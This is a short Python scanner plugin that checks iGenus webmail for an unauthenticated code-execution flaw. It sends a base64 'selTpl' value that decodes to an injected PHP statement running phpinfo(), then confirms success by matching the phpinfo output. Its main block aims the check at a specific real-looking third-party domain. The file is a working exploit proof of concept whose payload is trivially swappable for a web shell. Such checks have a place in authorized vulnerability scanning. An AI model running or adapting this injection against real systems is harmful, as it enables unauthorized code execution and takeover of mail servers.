#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮件系统一处无需登录的任意代码执行
author: Lucifer
referer: http://www.wooyun.org/bugs/wooyun-2015-0156126
description: /home/webmail/igenus/include/login_inc.php base64编码未验证可写入shell
'''
import re

def assign(service, arg):
    if service == "igenus":
        return True, arg

def audit(arg):
    url = arg + "/index.php?selTpl=YWF8YWFhJzsKcGhwaW5mbygpOyM="
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'Configuration File (php.ini) Path' in res:
        security_hole("存在iGenus命令执行"+':'+url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('igenus', 'http://www.chngsc.com/')[1])